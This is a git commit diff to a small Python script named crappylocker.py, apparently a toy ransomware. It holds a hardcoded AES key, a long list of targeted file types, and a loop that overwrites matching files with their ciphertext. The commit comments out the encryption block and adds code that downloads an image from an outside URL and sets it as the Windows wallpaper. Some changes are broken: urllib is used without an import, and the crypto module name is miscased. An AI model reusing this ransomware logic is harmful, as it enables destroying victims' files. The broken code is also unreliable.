f2f6b7a2596689c4df1a1e40c143b1abf9ed0743
yestoi <yestoi1@gmail.com>
2015-03-28 09:01:32 -0700

    Update crappylocker.py

--- crappylocker.py
+++ crappylocker.py
@@ -1,9 +1,23 @@
 #!/usr/bin/python
 
-import os, fnmatch
+import os, fnmatch, ctypes
 from Crypto import Random
-from Crypto.Cipher import AES
+from crypto.cipher import AES
 
+try:
+	homedir = os.path.expanduser('~')
+
+	f = open(homedir + "\\image.bmp", "rb+")
+	f.write(urllib.urlopen("http://www.ece.rice.edu/~wakin/images/lena512.bmp").read())
+	f.close()
+
+	SPI_SETDESKWALLPAPER = 20
+	ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, f.name, 0)
+	
+except:
+	pass
+
+'''
 key = b'\xbf\xc0\x85)\x10nc\x94\x02)j\xdf\xcb\xc4\x94\x9d(\x9e[EX\xc8\xd5\xbfI{\xa2$\x05(\xd5\x18'
 filetypes = ("*.odt","*.ods","*.odp","*.odm","*.odb","*.doc","*.doc","*.doc","*.wps","*.xls","*.xls","*.xls","*.xls","*.xlk","*.ppt","*.ppt","*.ppt","*.mdb","*.acc","*.pst","*.dwg","*.dxf","*.dxg","*.wpd","*.rtf","*.wb","*.mdf","*.dbf","*.psd","*.pdd","*.eps","*.ai","*.ind","*.cdr","*.jpg","*.dng","*.arw","*.srf","*.sr","*.bay","*.crw","*.cr","*.dcr","*.kdc","*.erf","*.mef","*.mrw","*.nef","*.nrw","*.orf","*.raf","*.raw","*.rwl","*.rw","*.ptx","*.pef","*.srw","*.der","*.cer","*.crt","*.pem","*.pfx","*.pdf","*.odc")
 filelist = []
@@ -27,3 +41,4 @@ for filename in filelist:
 		f.write(ciphertext)
 		f.truncate()
 		f.close()
+'''
